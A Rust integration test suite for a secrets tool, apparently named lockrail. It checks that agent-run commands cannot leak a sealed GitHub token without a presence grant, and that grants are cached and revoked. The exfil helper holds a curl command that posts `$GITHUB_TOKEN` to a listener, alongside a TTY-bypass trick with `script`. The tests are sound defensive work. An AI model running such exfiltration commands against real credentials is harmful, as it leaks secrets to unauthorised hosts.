//! PLAN.md GATE 4 (debug build, presence stub): the agent-path exfil test, grant caching and
//! re-prompt on a project change, and always-presence under a TTY (`script -q /dev/null`).
//! Uses `LOCKRAIL_SYSTEM_DIR` to make the machine managed and `LOCKRAIL_PRESENCE_STUB` for
//! presence; neither is honoured by release builds.

use std::io::Read;
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::mpsc;
use std::time::Duration;

struct Env {
    _tmp: tempfile::TempDir,
    home: PathBuf,
    system: PathBuf,
    project: PathBuf,
    stub_log: PathBuf,
}

fn env() -> Env {
    let tmp = tempfile::tempdir().unwrap();
    let r = tmp.path().to_path_buf();
    for d in ["home", "system", "project"] {
        std::fs::create_dir_all(r.join(d)).unwrap();
    }
    Env {
        home: r.join("home"),
        system: r.join("system"),
        project: r.join("project"),
        stub_log: r.join("prompts.log"),
        _tmp: tmp,
    }
}

fn cmd(e: &Env) -> Command {
    let mut c = Command::new(env!("CARGO_BIN_EXE_lockrail"));
    c.env("LOCKRAIL_HOME", &e.home)
        .env("LOCKRAIL_SYSTEM_DIR", &e.system)
        .env("LOCKRAIL_KEYSTORE", "file")
        .env("LOCKRAIL_PRESENCE_STUB_LOG", &e.stub_log)
        .env_remove("LOCKRAIL_PASSWORD")
        .current_dir(&e.project);
    c
}

fn ok(e: &Env, args: &[&str]) -> serde_json::Value {
    let out = cmd(e).args(args).arg("--json").output().unwrap();
    assert!(
        out.status.success(),
        "{args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    serde_json::from_slice(&out.stdout).unwrap()
}

fn make_managed(e: &Env) {
    let key = e.project.join("org.key");
    let out = ok(e, &["policy", "keygen", "--out", key.to_str().unwrap()]);
    std::fs::write(e.system.join("org.pub"), out["org_pub"].as_str().unwrap()).unwrap();
}

struct Broker(Child);
impl Drop for Broker {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

fn start_broker(e: &Env, stub: &str) -> Broker {
    let broker = Broker(
        cmd(e)
            .args(["broker", "serve"])
            .env("LOCKRAIL_PRESENCE_STUB", stub)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap(),
    );
    let socket = e.home.join("broker.sock");
    for _ in 0..100 {
        if std::os::unix::net::UnixStream::connect(&socket).is_ok() {
            return broker;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    drop(broker); // kills and reaps the child
    panic!("broker did not start");
}

/// A one-shot listener: returns its port and a channel with every byte it received.
fn listener() -> (u16, mpsc::Receiver<Vec<u8>>) {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = l.local_addr().unwrap().port();
    let (tx, rx) = mpsc::channel();
    std::thread::spawn(move || {
        l.set_nonblocking(false).unwrap();
        if let Ok((mut s, _)) = l.accept() {
            s.set_read_timeout(Some(Duration::from_millis(500)))
                .unwrap();
            let mut buf = Vec::new();
            let _ = s.read_to_end(&mut buf);
            let _ = tx.send(buf);
        }
    });
    (port, rx)
}

fn secret() -> String {
    ["ghp_", "Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Jh1Gf0Ed9Cb8"].concat()
}

fn sealed_env(e: &Env) -> PathBuf {
    std::fs::write(
        e.project.join(".env"),
        format!("GITHUB_TOKEN={}\n", secret()),
    )
    .unwrap();
    ok(e, &["env", "seal", ".env", "--out", "f.env.lockrail"]);
    e.project.join("f.env.lockrail")
}

fn exfil(e: &Env, file: &Path, port: u16) -> std::process::Output {
    // Through `sh -c` so `$GITHUB_TOKEN` expands to whatever `env run` injected.
    let script = format!("curl -s -m 2 -d \"$GITHUB_TOKEN\" http://127.0.0.1:{port}/");
    cmd(e)
        .args([
            "env",
            "run",
            "--file",
            file.to_str().unwrap(),
            "--",
            "sh",
            "-c",
            &script,
        ])
        .output()
        .unwrap()
}

fn prompts(e: &Env) -> usize {
    std::fs::read_to_string(&e.stub_log)
        .map(|t| t.lines().count())
        .unwrap_or(0)
}

#[test]
fn managed_without_broker_fails_closed() {
    let e = env();
    ok(&e, &["setup", "--tools", "claude"]);
    let file = sealed_env(&e);
    make_managed(&e);
    let (port, rx) = listener();
    let out = exfil(&e, &file, port);
    assert_eq!(
        out.status.code(),
        Some(3),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(String::from_utf8_lossy(&out.stderr).contains("broker_unavailable"));
    assert!(
        rx.recv_timeout(Duration::from_millis(800)).is_err(),
        "listener received bytes"
    );
}

#[test]
fn agent_path_exfil_without_a_grant_sends_nothing() {
    let e = env();
    ok(&e, &["setup", "--tools", "claude"]);
    let file = sealed_env(&e);
    make_managed(&e);
    let _broker = start_broker(&e, "deny");
    let (port, rx) = listener();
    let out = exfil(&e, &file, port);
    assert_eq!(
        out.status.code(),
        Some(3),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(String::from_utf8_lossy(&out.stderr).contains("grant_required"));
    assert!(
        rx.recv_timeout(Duration::from_millis(800)).is_err(),
        "listener received bytes"
    );
}

#[test]
fn unmanaged_without_broker_is_the_documented_residual() {
    // I-4: an unmanaged machine with no broker keeps 0.3.7 behaviour, so the secret leaves.
    // This is the red baseline for the test above and the residual the docs must state.
    let e = env();
    ok(&e, &["setup", "--tools", "claude"]);
    let file = sealed_env(&e);
    let (port, rx) = listener();
    // `curl` itself times out (the listener never answers), and `env run` now passes that exit
    // status through; what this residual is about is that the bytes arrived.
    let _ = exfil(&e, &file, port);
    let got = rx.recv_timeout(Duration::from_secs(3)).unwrap_or_default();
    assert!(
        String::from_utf8_lossy(&got).contains(&secret()),
        "expected the residual leak"
    );
}

#[test]
fn grant_is_cached_then_reprompted_after_a_project_change() {
    let e = env();
    ok(&e, &["setup", "--tools", "claude"]);
    let file = sealed_env(&e);
    make_managed(&e);
    std::fs::write(e.project.join("deploy.js"), "console.log(1)").unwrap();
    let _broker = start_broker(&e, "approve");
    let run = || {
        let out = cmd(&e)
            .args(["env", "run", "--file", file.to_str().unwrap(), "--", "true"])
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    run();
    assert_eq!(prompts(&e), 1);
    run();
    assert_eq!(
        prompts(&e),
        1,
        "second identical run should use the cached grant"
    );
    std::fs::write(e.project.join("deploy.js"), "console.log(2)").unwrap();
    run();
    assert_eq!(prompts(&e), 2, "a project edit must invalidate the grant");
    ok(&e, &["broker", "revoke"]);
    run();
    assert_eq!(prompts(&e), 3, "revoke must drop the grant");
}

#[test]
fn export_needs_presence_even_with_a_tty() {
    let e = env();
    ok(&e, &["setup", "--tools", "claude"]);
    ok(&e, &["secret", "set", "K", "v-123456789"]);
    make_managed(&e);
    let _broker = start_broker(&e, "deny");
    let bin = env!("CARGO_BIN_EXE_lockrail");
    // `script -q /dev/null <cmd>` gives the command a TTY (the M4 bypass of TTY heuristics).
    let out = Command::new("script")
        .args(["-q", "/dev/null", bin, "secret", "export"])
        .env("LOCKRAIL_HOME", &e.home)
        .env("LOCKRAIL_SYSTEM_DIR", &e.system)
        .env("LOCKRAIL_KEYSTORE", "file")
        .env_remove("LOCKRAIL_PASSWORD")
        .current_dir(&e.project)
        .output()
        .unwrap();
    let text =
        String::from_utf8_lossy(&out.stdout).to_string() + &String::from_utf8_lossy(&out.stderr);
    assert!(text.contains("presence_denied"), "{text}");
    assert!(
        !text.contains("v-123456789"),
        "secret exported without presence"
    );
}
